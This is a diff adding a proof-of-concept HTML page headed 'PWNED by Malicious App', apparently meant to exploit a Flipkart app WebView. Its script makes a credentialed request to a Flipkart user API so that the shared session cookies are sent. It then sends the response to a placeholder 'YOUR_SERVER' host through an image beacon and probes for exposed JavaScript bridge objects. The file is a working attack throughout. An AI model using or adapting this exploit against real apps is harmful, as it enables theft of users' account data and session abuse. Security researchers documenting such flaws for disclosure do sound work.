@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head><title>PoC</title></head>
+<body>
+<h1 style="color:red;font-size:48px">PWNED by Malicious App</h1>
+<p id="out">Attempting authenticated API call...</p>
+<script>
+// Demonstrate credentialed access — Flipkart WebView shares CookieManager
+// so cookies for flipkart.com domains are sent when XHR hits those domains
+fetch("https://www.flipkart.com/api/3/user", {credentials:"include"})
+  .then(r => r.text())
+  .then(data => {
+    document.getElementById("out").innerText = "API response: " + data.substring(0, 200);
+    // Exfiltrate to attacker's server
+    new Image().src = "https://YOUR_SERVER/log?d=" + encodeURIComponent(data.substring(0,300));
+  })
+  .catch(e => {
+    document.getElementById("out").innerText = "Error: " + e;
+  });
+
+// Also probe JS bridge (WebAppInterface is added in WebViewFragment)
+setTimeout(() => {
+  let bridges = [];
+  ["FlipkartWebAppInterface","WebAppInterface","JSBridge","flipkartInterface"].forEach(n => {
+    if(window[n]) bridges.push(n + ": " + typeof window[n]);
+  });
+  document.getElementById("out").innerText += "\nBridges found: " + bridges.join(", ");
+}, 1000);
+</script>
+</body>
+</html>
